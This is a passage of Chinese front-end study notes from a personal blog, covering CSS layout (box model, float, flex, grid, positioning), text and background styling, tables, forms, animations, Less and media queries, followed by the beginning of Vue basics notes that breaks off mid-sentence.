如果这7个值有两个auto，且一个是width一个是margin，则宽度会调整到最大，设置为auto的外边距自动为0。 如果三个都是auto，则padding为0，width最大。（全屏） 如果将两个外边距auto，宽度固定，则会将外边距设置为相同的值。（元素在父元素居中） 经常利用这个特点使元素在子元素内居中 垂直布局 默认情况下父元素的高度会被内容撑开如果子元素的大小超过了父元素，则子元素会从父元素溢出 使用overflow属性设置父元素如何处理溢出的子元素，可选值如下： visible：默认值，子元素会从父元素中溢出，在父元素外部的位置显示 hidden：溢出内容会被裁剪，不会显示（“一剪没”） scroll：生成垂直和水平两个滚动条，通过滚筒条查看完整内容 auto：根据需要生成滚动条（水平还是垂直） overflow-x：单独处理水平方向的 overflow-y：单独处理垂直方向的 相邻的垂直方向外边距的折叠（重叠） 相邻 且 垂直才适用这种情况。 兄弟元素 两者都是正值：会取两者之间的较大值 特殊情况：一正一负：取两者的和；两负：取两者绝对值较大的 兄弟元素外边距的重叠对开发是有利的，不需要处理 父子元素 子元素的会传递给父元素（上外边距） 父子元素外边距的重叠会影响到页面布局，必须处理！解决方法：要么不用外边距（给父元素padding），要么别相邻（给父元素border，隔开外边距） 解决方案：::before伪元素 + display:table 1234.box1::before&#123; content:&#x27;&#x27;; display:table&#125; table既可以解决高度塌陷，又可以解决外边框重叠。 行内元素的盒模型 文字的垂直居中：要让一个文字在父元素中垂直居中，只需让父元素的line-height和父元素height相等。 行内元素不支持设置宽度和高度，因为行内元素没有内容区，宽高是对内容区而言的 行内元素支持设置padding、border和margin，但垂直方向的这些属性不会影响页面的布局 display，用来设置元素显示的类型 inline：将元素设置为行内元素 block：将元素设置为块元素 inline-block：将元素设置为行内块元素（既可以设置宽高，又不会独占一行，有点像替换元素的特点） 行内块元素同时具备行内元素和块元素的优点和缺点。尽量避免使用行内块元素！ table：将元素设置为一个表格 none：元素不在页面中显示 不占据页面的位置！ visibility，用来设置元素的显示状态 visible：默认值，元素在页面中正常显示 hidden：元素在页面中隐藏不显示 依然占据页面的位置！ 浮动 元素设置浮动后会完全从文档流中脱离，不再占用文档流的位置！脱离后，元素的一些特点也会发生变化。脱离文档流的特点如下： 块元素不再独占一行，且宽度和高度默认都被内容撑开 行内元素会变成块元素。 脱离文档流后，不需要再去区分块元素和行内元素! 设置浮动后，元素会向其父元素的左侧或右侧移动。默认值为none。 浮动元素不会从父元素中移出。 水平上，浮动元素向左或向右移动时， 不会超过 它前面的其他浮动元素。 垂直上，浮动元素不会超过它上边的浮动的兄弟元素，最多和它一样高。 若浮动元素的上边是一个没浮动的块元素，则浮动元素无法上移。 浮动元素不会盖住文字，文字会自动环绕在浮动元素周围。所以可以利用浮动设置文字环绕图片的效果。 浮动的高度塌陷问题在布局中，父元素的高度默认是被子元素撑开的。但是若子元素浮动后，其会完全脱离文档流，子元素从文档流中脱离将会无法撑起父元素的高度，导致父元素的高度丢失。其下一个元素会自动上移。页面布局混乱。 解决方案： 如果塌陷了的元素样式可以写死，可以直接给塌陷了的元素设置一个height。 BFC（Block Formatting Context）、clear和clearfix。 BFCBFC：CSS中的一个隐含属性，可以为一个元素开启BFC。开启BFC后，该元素会变成一个 独立的布局区域 。元素开启BFC后的特点如下： 开启BFC的元素不会被浮动元素覆盖 开启BFC的元素子元素和父元素的外边距不会重叠 开启BFC的元素可以包含浮动的子元素（解决高度塌陷） 由于BFC是一种隐含属性，不能直接开启，可以通过一些特殊的方式开启元素的BFC： （不推荐）设置元素的浮动（给想要包含浮动子元素的元素开启）。副作用：从文档流中脱离，宽度丢失。可能影响布局。 （不推荐）将元素设置为行内块元素。不会从文档流中脱离。副作用：宽度丢失。 （推荐）将元素的overflow设置为一个不是visible的属性：overflow：hidden或overflow：auto。 clear作用：清除浮动元素对当前元素产生的影响原理：设置清除浮动后，浏览器会自动为元素添加一个 上外边距，以使其位置不受其他元素的影响。可选值：left：清除左侧浮动元素对当前元素产生的影响；right：清除右侧浮动元素对当前元素产生的影响；both：清除两侧中最大影响的那侧（最常用）。 高度塌陷的最终解决方案：用::after伪类 12345.box1::after&#123; content:&#x27;&#x27;; clear:both; display:block/table; &#125; 解决高度塌陷和外边框重叠的最终方案（灵活，推荐）给存在这两种问题的元素直接添加一个clearfix类名： 12345.clearfix::before,.clearfix::after&#123; content:&#x27;&#x27;; display:table; clear:both;&#125; flex布局主要用来代替浮动完成页面布局。可以使元素带有弹性，让元素可以跟随页面大小的改变而改变。当父元素盒子设置为flex布局后，子元素的float、clear、vertical-align属性将失效。弹性容器：通过display:flex设置为块级弹性容器，display:inline-flex设置为行内的弹性容器。弹性元素：弹性容器的 直接子元素 是弹性元素。元素可以既是弹性容器，又是弹性元素。 弹性容器的样式主轴：弹性元素的排列方向；侧轴：与主轴垂直方向。凡是justify***都是主轴的，align***都是辅轴的。 容器中弹性元素的排列方式：flex-direction 弹性元素是否在容器中自动换行：flex-wrap 排列方式和换行的简写属性：flex-flow 对齐相关的样式： justify-content：元素在主轴如何对齐（如何分配主轴空白空间） flex-start、flex-end：沿主轴起边&#x2F;终边对齐 center：居中 space-around、space-between、space-evenly align-content：设置元素在辅轴如何对齐（如何分配辅轴空白空间）。可选值和justify-content一样，多一个stretch。 只能用于子项出现换行的情况（多行），单行下没有效果。 align-items：子项为单行时使用。设置元素在辅轴如何对齐。 适用于单行的情况，只有上对齐、下对齐、居中和拉伸。 stretch：默认值，将元素的长度设置为相同的值 flex-start、flex-end：沿辅轴起边&#x2F;终边对齐，不会拉伸元素 center：居中 base-line：基线对齐，用的不多。 弹性元素的样式只有三个：增长、缩短、基础长度。通过align-self覆盖当前元素上的align-items。 flex-grow、flex-shrink：指定弹性元素的伸展&#x2F;收缩系数。父元素的剩余空间会按照比例分配&#x2F;当父元素空间不足以容纳所有子元素时，对子元素进行压缩。 flex-basis：元素在主轴上的基础长度。默认auto，即参考元素自身的高度和宽度。 这三个值可以看作是弹簧的三个状态：伸长，压缩，放松。 可以通过简写属性flex设置弹性元素所有的三个样式。flex:增长 缩减 基础。 initial：即为flex:0 1 auto，只能减。 auto：即为flex:1 1 auto，可增可减。 none：即为flex:0 0 auto，元素没有弹性。 还可以使用order决定弹性元素的排列顺序。 grid布局与flex最大的不同就是，Flex是轴线布局，指定的都是针对轴线的位置，可以看作是一维布局；而Grid 布局则是将容器划分成行列，产生单元格，然后指定”项目所在”的单元格，可以看作是二维布局。通过dispaly:grid;（dispaly:inline-grid;）开启。 虽然grid布局很强大，但兼容性差于flex。使用前应注意兼容性问题。 容器属性行高和列宽：1.grid-template-columns：每一列的列宽，如grid-template-columns:100px 100px 100px，即显示为三列，每一列宽度100px 。和grid-template-columns:repeat(3,100px)效果相同。 auto-fill：当单元格大小固定，但容器大小不确定时，使用auto-fill属性进行自动填充。如grid-template-columns: repeat(auto-fill,100px)。 fr：为了方便表示比例关系，网格布局提供了fr关键字(fraction 的缩写，意为”片段”)。如grid-template-columns:repeat(4,1fr)，意为列宽平均分成四等份。grid-template-columns:1fr 2fr 3fr，意为列宽分成6份，各占 1 2 3 份。 minmax()：函数产生一个长度范围，表示长度就在这个范围之中，它接受两个参数，分别为最小值和最大值。第一个参数最小值,第二个最大值。 auto：表示由浏览器自己决定长度。 网格线：可以用方括号定义网格线名称，方便以后给盒子定位使用。如grid-template-columns: [c1] 100px [c2] 100px [c3] 100px [c4]。 2.grid-template-rows：每一行的行高。 间距：item相互之间的距离。1.row-gap：一行中相邻item的间距。2.column-gap：一列中相邻item的间距。3.gap：前二者的简写属性。 设置区域内单元格是否使用：grid-template-areas。用法如下图，名字相同标识在同一个区域，定位或者写项目属性的时候会用到。 设置子元素的排放顺序：划分网格后，容器的子元素会按照顺序自动放置在每一个网格。默认的放置顺序是”先行后列”，即先填满第一行，再开始放入第二行。1.grid-auto-flow:row：同默认放置方式。2.grid-auto-flow:column：先放入第一列，满了再开始放入第二列。3.grid-auto-flow:row dense：表示换行时留下的空间可以由下面的元素填补上去。![row dense](row dense›.png) 设置对齐相关的样式：1.justify-items：单元格内容的水平对齐方式。可选：start｜end｜center｜stretch。2.align-items：单元格内容的垂直对齐方式。可选同上。 属性place-items : start end是这两个属性的简写。 3.justify-content：整个内容区域（所有的项目的总和）的水平对齐方式。可选：start｜end｜center｜stretch｜space-around｜space-between｜space-evenly。4.align-content：整个内容区域（所有的项目的总和）的垂直对齐方式。可选同上。 设置多出来的项目的宽高：使用属性grid-auto-columns或grid-auto-rows。 项目属性根据在哪根网格线设置item的具体位置：使用grid-column-start / grid-column-end grid-row-start / grid-row-end。属性grid-column: 1 / 3是前两个的简写。指定了项目所占的格数，跨列数： 设置项目放在哪一个区域：通过grid-area配合grid-template-areas设置。grid-area和 grid-row-start / grid-column-start / grid-row-end / grid-column-end的缩写格式为：grid-area:1 / 1 / 2 / 3。 设置对齐相关的样式：通过justify-self / align-self / place-self。 定位用position属性。默认为static，即元素是静止的，没有开启定位。只要开了定位，就都是一个层级；和哪种定位无关。 关于层级：如果元素的层级一样，则优先显示靠下的元素。祖先元素的层级再高也不会盖住后代元素。 绝对定位：absolute相对于其包含块（containing block）定位。 关于包含块（正常情况下，包含块就是当前元素 最近 的祖先 块 元素）绝对定位的包含块：当前元素最近的开启了定位的祖先元素；若所有祖先元素都没开启定位，则根元素就是它的包含块。 若不设置偏移量，元素位置 不会发生变化。 开启绝对定位的元素会 从文档流中脱离 ，性质发生变化：行内变成块，块的宽高被内容撑开。 会使元素提升一个层级。 水平方向的布局等式需要添加left和right两个值。规则还和以前一样。 当发生过度约束时： 如果9个值中没auto，则自动调整right； 如果有auto（margin width left right），则自动调整auto的值：由于left和right的值默认是auto，所以当未设置它们的值且等式不满足时会自动调整这两个值。所以如果想通过margin设置居中的话必须要设置left和right为0。即水平居中：left: 0；right:0; margin-left:auto;margin-right:auto 绝对定位后，垂直方向的等式也必须满足：top+margin-top&#x2F;bottom+padding-top&#x2F;bottom+height&#x3D;包含块的高度 垂直居中：top:0;bottom:0;margin-top:0;margin-bottom:0 在 父元素 中垂直且水平居中：top:0;bottom:0;left:0;right:0; margin:auto 相对定位：relative“灵魂出窍：移出来的是魂，肉体还在之前的位置”偏移量：top,bottom,left,right，是定位元素和定位位置上下左右的距离。参照 元素自身在文档流 中的位置。而且， 没有脱离文档流。相对定位的特点： 开启后，若不设置偏移量，元素不会发生任何变化 会提升元素的层级 不会改变元素性质：块还是块，行内还是行内 固定定位：fixed也是一种绝对定位，大部分特点和绝对定位一样。唯一不同：固定定位永远参照浏览器的视口进行定位。不会随网页的滚动条滚动。 粘滞定位：sticky兼容性较差。一般不采用。（完全不兼容IE） 和相对定位的特点基本一致 不同的是粘滞定位可以在元素到达某个位置时进行固定，参照包含块。 文字font可以设置字体相关的所有属性。字体大小和字体族必须有。会覆盖单独设置的值。 12font: 样式（font-style） 字重（font-weight） 字体大小/行高（lineheight） 字体族font：italic bold 50px/2 微软雅黑，‘Times New Roman’,Times,serif; 行高lineheight和字体框行高lineheight指的是文字占有的实际高度。可以任意指定一个大小（px em），也可以设置为整数，整数的意义是字体的指定的倍数。 注意行高指的是 单行 的行高！ 字体框是字体存在的格子，设置font-size字体大小实际就是设置字体框的高度。 行高会在字体框上下平均分配。 可以将行高设置为和高度一样的值，使 单行 文字在父元素中垂直居中 行高经常还用来设置文字的行间距。css没有行间距的属性，利用公式行间距=行高-字体大小来间接控制行间距。 文本的水平和垂直对齐水平对齐：text-align，默认值left ；right ；居中对齐center ；两端对齐justify 注意text-align只能给块元素设置！ 垂直对齐：vertical-align，默认值基线对齐baseline；顶部对齐top；底部对齐bottom；居中对齐middle（中线对齐）。还可以直接指定值vertical-align:100px。 用img标签引入图片时，由于图片作为替换元素性质很像行内元素，默认是基线对齐，导致图片和它父元素的border之间有一条缝隙，这个缝隙就是图片的 基线 。想消除这个缝隙：将图片的vertical-align设置为除baseline外的任意值即可。 其他文本样式设置文本修饰：text-decoration。不兼容IE。可选：none ；overline ；underline ；line-through。 设置网页如何处理空白：white-space。可选：normal ；nowrap ；pre保留空白（预处理文本，保留html文件中写的格式）； 如何实现文字显示不全，有省略号的效果？ 123456.box&#123; width:200px; white-space:nowrap; overflow:hidden; text-decoration:ellipsis;&#125; 其中width设置文本包含框宽度；white-space:nowrap; overflow:hidden; text-decoration:ellipsis;三者缺一不可。 背景可以使用简写属性background设置。 background- size必须写在background-position后面，并且使用&#x2F;隔开。即background-position/background-size。 background-origin必须在background-clip前面。 1background: url(&quot;./1.png&quot;) #bfa center center/contain no-repeat； 同时设置背景图片和背景颜色：background-img:url(&quot;./1.png&quot;)。背景重复方式：background-repeat:no-repeat。背景图片的位置：background-position:top left。使用方位词时必须同时指定两个，如果只写一个另一个默认为center。也可以通过偏移量指定背景图片的位置。背景图的偏移量：background-origin:content-boc。背景图片大小：background-size：100% auto。第一个值宽度，第二个值高度，如果只写一个则另一个默认为auto（图片比例不变）。cover：图片比例不变，将元素铺满contain：图片比例不变，将图片在元素中完整显示 关于background-position的计算原点padding-box：默认值，background-position从内边距（左上角）开始计算content-box：从内容区处计算border-box：从边框处计算用background-clip:padding-box设置背景范围。border-box：默认值，背景会出现在边框的下面（内容区内边框和边框）padding-box：背景只到内边距（内容区和内边距出现），不会出现在边框content-box：背景只到内容区 用background-attachment:scroll设置背景图片是否跟随元素移动。scroll：默认值，背景图片会跟随元素移动fixed：背景会固定在页面中 渐变色 需要通过backgroud-image设置！ 线性渐变：backgroud-image:linear-gradient(to right,red,yellow,#bfa)。开头可以指定渐变方向，多个颜色默认平均分布。 可以平铺的线性渐变：backgroud-image:repeating-linear-gradient(to right,red,yellow,#bfa) 径向渐变（放射渐变）：backgroud-image:radial-gradient(100px 100px at top left,red,yellow) 语法：radial-gradient(大小at位置,颜色 位置,颜色 位置,...) 大小：circle、ellipse、closet&#x2F;fasthest-side&#x2F;corner 位置：top、right、left、center、bottom 表格table中，使用tr表示表格的一行，有几个&lt;tr&gt;就有几行。tr中，使用td表示一个单元格，有几个&lt;td&gt;就有几个单元格。用rowspan指定行宽。即纵向合并单元格。用colspan指定列宽。 下面是一个两行四列的表格。 123456789101112&lt;table border=&quot;1&quot; width=&quot;50%&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;a1&lt;/td&gt; &lt;td&gt;c1&lt;/td&gt; &lt;td rowspan=&quot;2&quot;&gt;d1&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;a2&lt;/td&gt; &lt;td&gt;b2&lt;/td&gt; &lt;td&gt;c2&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 可以将一个表格分成三部分：头部thead，主体tbody，底部tfoot。还有&lt;th&gt;标签，表示头部部分的单元格，会有加粗效果。 若表格中没有使用tbody而是直接使用tr，那么浏览器会自动创建一个tbody，并且将tr全部放入tbody。因此 tr不是table的子元素 ！ 表格样式指定边框之间的距离：border-spacing设置边框的合并：border-collapse:collapse设置隔行变色效果：tr:nth-child(odd)&#123;backgroundcolor:gray;&#125; 默认情况下元素在td中垂直居中。也可以通过vertical-align设置垂直对齐方式。用text-align设置水平对齐方式。（top bottom center） 利用这个特性，可以通过将父元素display:table和vertical-align让子元素垂直居中。注意水平居中仍需要用margin:0 auto实现，不能直接使用text-align。 表单 数据要提交到服务器中，必须要为元素指定一个name属性！ 123456&lt;form action=&quot;target.html&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;这是一个文本框&quot; autocomplete=&quot;off&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;这是一个密码框&quot; disabled&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot; value=&quot;这是一个提交按钮&quot; readonly&gt;&lt;/form&gt; 必填项action：内容为表单要提交的服务器的地址。属性autocomplete：是否开启自动补全。 单选框：同一个“name”字段即可划分到同一组单选按钮中，“value”属性会作为用户填写的值发给服务器。“checked”可以将单选按钮设置为默认选中。 12&lt;input type=&quot;radio&quot; name=&quot;group1&quot; value=&quot;a&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;group1&quot; value=&quot;b&quot; checked&gt; 还有多选框（type&#x3D;”checkbox”）、下拉列表（&lt;select&gt;&lt;option&gt;)等。 过渡简写属性：transtion。只有一个要求：如果要写 延迟 ，则两个时间中的第一个是持续时间。可以指定一个属性发生变化时的切换方式。 注意过渡时必须有两个有效数值！在它们之间过渡。auto不能起作用。 要执行过渡的属性：transtion-property:width。多个属性间使用，隔开，若所有属性都需要过渡，用all关键字。 过渡效果持续时间：transtion-duration。 过渡的时序函数：transtion-timing-function。 默认为ease，慢速开始，先加速再减速。 其他可选值：linear,ease-in,ease-in-out。用cubic-bezier()自己指定时序函数，参考本链接。 用steps()分布执行过渡效果。可以设置一个第二个值：end，在时间结束时执行过渡（默认值）; start，在时间开始时执行过渡。 过渡效果的延迟：transtion-delay，等待一段时间后再执行过渡。 动画简写属性：animation。只有一个要求：如果要写 延迟 ，则两个时间中的第一个是持续时间。过渡需要在某个属性发生变化时才会触发。动画可以自动触发。设置动画效果，必须先设置一个 关键帧 ，关键帧设置了动画执行的每一个步骤。 要对当前元素生效的关键帧的名字：animation-name:test 动画持续时间、延时和时序函数类似过渡：animation-duration animation-delay animation-timing-function 动画执行次数：animation-iteration-count 动画运动方向：animation-direction。可选：normal reverse alternate alternate-reverse。 动画执行状态：animation-play-state。可选：running paused 动画填充模式：animation-fill-mode。可选：none，默认值，动画执行完毕元素回到原来位置； forwards，动画执行完毕元素停在结束位置；backwards，动画延时等待时元素处于开始状态；both，结合了forwards和backwards。 关键帧12345678910111213@keyframes test&#123; /* from表示动画的开始位置，也可以使用0% */ from&#123; margin-top: 0; &#125; 25%,to&#123; margin-top: 400px; animation-timing-function: ease-out; &#125; 50%&#123; margin-top: 100px; &#125; /* to表示动画的结束位置，也可以使用100% */ 变形通过CSS改变元素的形状或位置。不会影响到页面布局。变形：transform。指定变形原点：transform-origin：0 0 平移使用translateX(100%)等。百分比是相对于 自身 去算的。之前所说的垂直且水平居中的方法：top:0;bottom:0;left:0;right:0; margin:auto，只适用于元素大小确定的情况；若元素大小是被内容撑开的则不能使用！因为在width、height、margin均为auto的情况下会优先调整宽和高。 利用X、Y轴方向上的平移实现水平&#x2F;垂直居中，适用于元素大小被内容撑开的情况：水平居中：left:50%; transform:translateX(-50%);水平且垂直居中：left:50%; top:50%; transform:translateX(-50%) translateY(-50%);。 Z轴平移：立体效果（近大远小）。默认情况下网页不支持透视。如果需要看见效果，必须设置网页视距如：perspective：800px。一般在html或body标签的样式中设置。 旋转使用rotateX()使元素沿着x(y z)轴旋转指定的角度。是否显示元素背面：backface-visibility：hidden 缩放使用scaleX()等实现各个方向的缩放。 less事实上，css原生也支持变量的设置和计算函数calc()，但兼容性欠佳。 1234567html&#123; --color:#bfa;&#125;.box&#123; width:calc(400x/2); color:var(--color);&#125; less是一门css的预处理语言。它是css的增强版，通过less可以编写更少的代码实现更强大的样式。在less中添加了很多新特性，如对变量的支持，对mixin的支持，在less中所有的数值都可以直接进行运算… 新版less中，除法运算必须带着单位放在括号内！ 语法大体上和css一致，但增加了许多对css的扩展。所以浏览器无法直接执行less代码，要执行必须将less转化为css，然后再由浏览器执行。在vscode中，需要安装插件：easy less。 用//对less进行单行注释，这种注释方法中的内容不会被解析到css中。用/* */也可以对less进行注释，内容会被解析到css文件中。 可以通过在less文件开头@import &quot;demo.less&quot;引入其他外部less文件，方便模块化开发。 语法变量：语法为@变量名。变量发生重名时优先使用比较近的变量。 12345678910111213@a:200px;@b:box2;// 作为类名或一部分值使用时必须以 @&#123;变量名&#125; 的形式使用.@&#123;b&#125;&#123; // 直接使用以 @变量名 的形式使用 width:@a;&#125;div&#123; width:300px; height:$width;&#125; 父元素： 1234567891011121314.box1&#123; &gt;.box3&#123; color:blue; // &amp; 表示的是外层的父元素box3 &amp;:hover&#123; color:yellow; &#125; &#125; // &amp; 表示的是外层的父元素box1。 div &amp;&#123; width:300px; &#125;&#125; 扩展：:extend()。对当前选择器扩展指定选择器的样式（选择器分组） 1234567.p1&#123; width:100px; height:200px;&#125;.p2:extend(.p1)&#123; color:red;&#125; 功能类似的还有混合函数。 1234567891011121314151617181920212223242526// 也可以直接引用指定的样式，相当于将p1的样式在这复制。// mixin混合.p3&#123; .p1();&#125;// 使用类选择器时可以在选择器后边添加括号，这就创建了一个mixins。再引用的时候可以省略括号。.p4()&#123; width:100px;&#125;.p5&#123; .p4;&#125;// 在混合函数中可以直接设置变量，也可以给变量设置默认值。设置默认值再引用可以不用全指定值。.test(@w,@h,@bg-color)&#123; width:@w; height:@h; border:1px solid @bg-color;&#125;div&#123; // 调用混合函数，按顺序或按名字传递参数 .test(200px,300px,#red) // 或 .test(@bg-color:red,@h:100px;@w:300px)&#125; 媒体查询语法：@media 查询规则&#123;&#125;。 媒体类型 all：所有设备 print：打印设备 screen：带屏幕的设备 speech：屏幕阅读器 媒体特性 width、height：视口宽度、视口高度 min-width、max-width：视口大于&#x2F;小于指定宽度时生效 样式切换的分界点称为断点，也就是网页样式会在这个点发生变化。 常用断点 小于768：超小屏幕，max-width&#x3D;768px 大于768：小屏幕，min-width&#x3D;768px 大于992：中型屏幕，min-width&#x3D;992px 大于1200:大屏幕，min-width&#x3D;1200px 可以在媒体类型前添加only，表示只有。only的使用主要是为了兼容一些老版本浏览器。使用逗号连接多个媒体类型，表示它们之间是 或 的关系。如@media print,screen&#123;&#125;；使用and连接多个媒体类型，表示它们之间是 且 的关系。在选择器前加not，表示“除了”，如@media not only screen and (min-width:768px)&#123;&#125;。一个较为完整的写法如下： 12345678910111213@media only screen and (min-width:768px) and (max-width:992px)&#123; body&#123; background-color: #red; &#125;&#125;// 或@media only screen &#123; @media (min-width:768px) and (max-width:992px)&#123; // 注意media后面要空格 body&#123; background-color: #red; &#125; &#125;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"HTML/CSS","slug":"前端/HTML-CSS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/HTML-CSS/"}],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://avalooooooon.github.io/tags/HTML/"},{"name":"CSS","slug":"CSS","permalink":"https://avalooooooon.github.io/tags/CSS/"}]},{"title":"Vue笔记","slug":"Vue笔记","date":"2022-01-08T14:33:40.000Z","updated":"2022-01-08T14:33:40.000Z","comments":true,"path":"2022/01/08/Vue笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/01/08/Vue%E7%AC%94%E8%AE%B0/","excerpt":"","text":"vscode插件：Vue 3 snippetsChrome插件：Vue.js devtools浏览器强制刷新：shift + 刷新按钮 简介Vue是一套用于构建用户界面的渐进式JS框架，渐进指Vue可以根据应用的复杂程度自底向上逐层的应用，对于简单应用它只需要一个轻量小巧的核心库，对于复杂应用则可以引入各式各样的Vue插件。它有以下特点： 采用组件化模式，提高代码复用率且更好维护。 声明式编码，让编码人员直接操作dom，提高开发效率。 使用虚拟dom+优秀的diff算法，尽量复用dom节点。 安装不使用cli在官网下载Vue.js和Vue.min.js，分别是开发版和生产版。在html文件head标签内指定路径，引入Vue.js：&lt;script src=&quot;vue.js&quot;&gt;&lt;/script&gt;。通过代码Vue.config.productionTip = false调整配置，以阻止 vue 在启动时生成生产提示。其它js代码应该都写在这句话之后。 使用cli环境：Windows101.安装node和npm环境 2.安装脚手架vue-cli 123npm install webpack -gnpm install --global vue-clivue -V 其中webpack是一个包管理工具，也是vue-cli的构建工具。上述命令可以完成webpack的全局安装。如果用nvs工具，可以在C:\\Program Files\\nodejs\\node_global中查看全局安装的vue-cli。 3.构建工程文件cd到工具区。在工作区中vue init webpack testproj以生成webpack脚手架。回车后可能会出现一些提示问题： 项目名称（注意名称中不要出现大写字母，否则会报错） 项目描述（可写可不写，看个人需要） 作者（可写可不写，看个人需要） vue编译，这个选默认即可，运行加编译Runtime + Compiler 是否安装vue-router是否安装vue路由工具 是否使用代码管理工具ESLint管理你的代码 后面几个是测试的工具，需要自己自行了解 可以选择在testproj工程新建好后系统自动进行初始化，安装package.json中描述的依赖。初始化完成后，cd进入项目文件夹。npm run dev运行项目。运行完成后打开浏览器，输入http://localhost:8080/ ，看到Welcome to Your Vue.js APP页面就可以说明项目脚手架已经初始化完成。 若出现报错&#39;webpack-dev-server&#39; 不是内部或外部命令，也不是可运行的程序或批处理文件，运行npm install webpack-dev-server --save-dev即可解决。 Vue核心和基础写法相比，使用Vue可以概括成不变化的都正常写，变化的都要动态指定，也就是前面带冒号，冒号就表示了动态。动态指定的数据都可以在浏览器的vue调试界面中看到。 12345678910111213141516171819202122232425&lt;body&gt; &lt;!-- 准备一个容器 --&gt; &lt;div id=&quot;demo&quot;&gt; &lt;h1&gt;hello,&#123;&#123;name.toUpperCase()&#125;&#125;&lt;/h1&gt; &lt;a v-bind:href=&quot;school.url&quot;&gt;百度一下&lt;/a&gt; &lt;/div&gt; &lt;script&gt; Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示 // 创建Vue实例 const vm = new Vue(&#123; // el指定当前Vue实例为哪个容器服务。建立实例和容器的关系。 // 值通常为CSS选择器字符串，也可以写作： // el: document.getElementById(&#x27;root&#x27;), el: &#x27;#demo&#x27;, data: &#123; // data中用于存储数据，数据供el所指定的容器去使用 name: &#x27;Bob&#x27;, school: &#123; url: &#x27;http://www.baidu.com&#x27; &#125; &#125; &#125;) &lt;/script&gt;&lt;/body&gt; el的两种写法 new Vue时配置el属性 el: &#39;#root&#39;, 创建完Vue实例后再通过v.$mount(&#39;#root&#39;);指定el的值，mount有“挂载”之意 data的两种写法 对象式data: &#123;name:&#39;Bob&#39;&#125; 函数式 data() &#123; return&#123;name:&#39;Bob&#39;&#125; &#125;。在使用组件时必须使用函数式。 由Vue管理的函数一定 不要写箭头函数 ！ 否则this将不再是Vue实例。 初识Vue 想让Vue工作，就必须创建一个Vue实例（new Vue(&#123;&#125;))，且需要传入一个配置对象（el:&#39;#root&#39;,data:&#123;name:&#39;bob&#39;&#125;）。 root容器内的代码依然符合html规范，只不过会混入一些特殊语法（如双括号&#123;&#123; &#125;&#125;。容器的两个作用：1.作Vue模版。2.让Vue知道把工作成果放在何处。 root容器内的代码被称为Vue 模版 。 模版的解析流程为，先有容器，再有Vue实例，实例工作时读到行el:&#39;#root&#39;，就会把容器拿过来并进行解析，扫描有没有自己的特殊语法，如果有则作相应的替换。解析完后放回页面，替换掉刚才的整个容器。也就是模版经过解析后变成目标html片段。 data中的数据发生任何变化，Vue都会把模版重新解析一遍，模版里调用的方法也会重新调用一遍。 Vue实例和容器必须一一对应。 真实开发中只有一个Vue实例，并且会配合组件一起使用。 MVVM模型MVVM(Model-view-viewmode)，简称vm，是一种软件架构模式，M指模型（model），对应data中的数据；V指视图（View），即模版（页面）；VM指视图模型，对应Vue实例对象（new Vue(&#123;&#125;)）。下图中的两个箭头分别表示监听DOM和数据绑定，即把数据放到指定位置。在文档中经常使用vm这个变量名表示Vue实例。 data中所有的属性最后都会出现在vm身上。（数据代理） vm身上所有的属性，Vue原型身上所有的属性，在Vue模版中都可以直接使用。 数据代理 方法**Object.defineproperty()**：第一个参数-给哪个对象添加属性；第二个参数-要添加的属性叫什么名字；第三个属性-配置项 123456789101112131415161718192021let number = 18;let person = &#123; name:&#x27;bob&#x27;,&#125;Object.defineProperty(person, &#x27;age&#x27;, &#123; // value: 18, // enumerable: true, // 控制属性是否可以枚举，默认值是false // writeble: true, // 控制属性是否可以被修改，默认值是false // confugurable: true, // 控制属性是否可以被删除，默认值是false // 当读取person的age属性时，get函数(getter)就会被调用且返回值是age的值 get: function hihi() &#123; return number; &#125;, // 当修改person的age属性时，set函数(setter)就会被调用且会收到修改的值 set(value) &#123; number = value; &#125;&#125;)console.log(person); 数据代理：通过一个对象代理另一个对象中属性的操作（读&#x2F;写），好处是可以更加方便的操作data中的数据（否则就得&#123;&#123;_data.age&#125;&#125;。vm.data其实就是我们写的那个data。也可以在构造Vue实例前定义一个对象data，再将这个data给vm：const vm = new Vue(&#123;el: &#39;#demo&#39;,data&#125;)。此时vm._data &#x3D; options.data &#x3D; data，options就是new Vue时传入的配置对象。）。图中橙色和紫色的双箭头就是数据代理，每条线都既利用了get也利用了set。以name为例，它通过getter读取到data（.data）里的name，在修改vm里的name时通过setter也会将data（.data）里的name进行修改。.data里的内容是数据劫持的后果。数据代理的基本原理：通过Object.defineproperty()把data对象中所有属性添加到vm上，再为每个添加到vm上的属性都指定一个getter&#x2F;setter，在getter&#x2F;setter内部去操作（读&#x2F;写)data中对应的属性， template标签&lt;template&gt;&lt;/template&gt;最大的特点就是不影响结构，类似于小程序中的&lt;block&gt;&lt;/block&gt;。最终页面渲染的时候通过检查元素查看，可以看到并没有实际的&lt;template&gt;&lt;/template&gt;结构。 需要注意的是template只能配合v-if，不能配合v-show。 模版语法 插值语法：用于解析标签体内容（标签体内使用）写法为&#123;&#123;xxx&#125;&#125;。xxx为js表达式，可直接读到data中的所有属性。注意插值插的是函数返回值时，需要加括号：&#123;&#123;fullName()&#125;&#125;。 指令语法：用于解析标签（标签属性、标签体内容、绑定事件等）都是以v-开头，有v-bind、v-model、v-on等。 数据绑定：分为单向绑定和双向绑定单向绑定：v-bind:href=&quot;xxx&quot;，数据只能从data流向页面。它可以简写为:href=&quot;xxx&quot;。xxx也要是js表达式，且可以直接读取到js中的所有属性。双向绑定：v-model:value=&quot;name&quot;，数据能从页面和data间双向流动，一般都应用在表单类元素中。它可以简写为v-model=&quot;name&quot;，因为v-model默认收集的就是value值。 事件处理 使用v-on:xxx（简写为@xxx，xxx为事件名）绑定事件，如v-on:click=&quot;showInfo&quot; 配合new Vue(&#123;methods:&#123;showInfo() 